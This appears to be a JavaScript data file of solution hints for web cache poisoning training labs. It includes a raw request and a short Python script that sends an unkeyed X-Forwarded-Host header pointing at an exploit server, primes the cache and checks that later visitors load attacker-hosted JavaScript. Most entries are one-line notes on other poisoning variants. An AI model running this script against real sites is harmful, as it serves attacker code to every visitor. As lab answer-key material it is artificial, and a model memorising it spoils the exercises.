export default {
  'cache-poisoning-lab-web-cache-poisoning-with-an-unkeyed-header': {
    note: '`X-Forwarded-Host` changes the script URL in the response but is not in the cache key; poison the page for everyone.',
    work: {
      hints: [
        'Find a cacheable page that loads a script from a host derived from a request header.',
        'Send `X-Forwarded-Host: attacker.example` with a cache-busting query. The response\'s `script src` changes.',
        'Host `/resources/js/tracking.js` on the exploit server, send the header without a cache buster, then request the page normally.'
      ],
      approach:
        'An unkeyed header reflected into a cacheable HTML response. The cache stores one copy per URL; the attacker primes it with a script URL they control. Every subsequent visitor loads attacker JavaScript in the lab origin.',
      request: `GET /en?cb=123 HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Forwarded-Host: exploit-EXPLOIT-ID.exploit-server.net
Connection: close`,
      tokens: [
        ['X-Forwarded-Host', 'A proxy header the origin trusts when building absolute URLs. It is not part of the cache key.'],
        ['exploit-...', 'The attacker host serving the malicious tracking.js.'],
        ['?cb=123', 'A cache buster used during testing so each probe misses the cache.'],
        ['script src', 'The reflected sink: the page now loads JavaScript from the attacker origin.'],
        ['(cache hit)', 'The poisoned body is served to later requests for the same key.']
      ],
      script: `import sys, requests

host, exploit = sys.argv[1], sys.argv[2]
base = f"https://{host}"
headers = {"X-Forwarded-Host": exploit}
r = requests.get(f"{base}/en?cb=1", headers=headers, timeout=20)
print("reflected:", exploit in r.text)
# Prime the cache without a buster, then verify with a clean request.
requests.get(f"{base}/en", headers=headers, timeout=20)
clean = requests.get(f"{base}/en", timeout=20)
print("poisoned:", exploit in clean.text)`
    }
  },
  'cache-poisoning-lab-web-cache-poisoning-with-an-unkeyed-cookie': {
    note: 'A cookie value is reflected into the page and excluded from the cache key; set it once to poison the cached body.'
  },
  'cache-poisoning-lab-web-cache-poisoning-with-multiple-headers': {
    note: 'Two headers must be combined to reach the sink; each is unkeyed, so send both to prime the cache.'
  },
  'cache-poisoning-lab-web-cache-poisoning-targeted-using-an-unknown-header': {
    note: 'Only a specific user-agent or a rarely used header reaches the sink; target the victim\'s browser profile.'
  },
  'cache-poisoning-lab-web-cache-poisoning-unkeyed-query': {
    note: 'The cache ignores the query string; a parameter reflected into the page can poison the path-only key.'
  },
  'cache-poisoning-lab-web-cache-poisoning-unkeyed-param': {
    note: 'One query parameter is excluded from the key but still reflected; use it to carry the payload.'
  },
  'cache-poisoning-lab-web-cache-poisoning-param-cloaking': {
    note: 'A delimiter (`;` or encoded `&`) makes the cache and origin parse different parameters; the cache keys one, the origin uses another.'
  },
  'cache-poisoning-lab-web-cache-poisoning-fat-get': {
    note: 'The origin processes a body on a GET, but the cache keys only the URL; put the payload in the body.'
  },
  'cache-poisoning-lab-web-cache-poisoning-normalization': {
    note: 'The cache normalises the path differently from the origin; two raw URLs share a key, letting a poisoned response cross paths.'
  },
  'cache-poisoning-lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria': {
    note: 'Only static extensions are cached; craft a path that satisfies the rule while the page\'s DOM sink still reads the reflected value.'
  },
  'cache-poisoning-lab-web-cache-poisoning-combining-vulnerabilities': {
    note: 'Chain an unkeyed header with a normalization quirk so the poisoned response is stored under the victim\'s URL.'
  },
  'cache-poisoning-lab-web-cache-poisoning-cache-key-injection': {
    note: 'An attacker-controlled header is part of the cache key; inject a key that targets a specific victim or page.'
  },
  'cache-poisoning-lab-web-cache-poisoning-internal': {
    note: 'An internal cache, not the CDN, stores a response derived from an unkeyed input; poison it through the application layer.'
  }
}
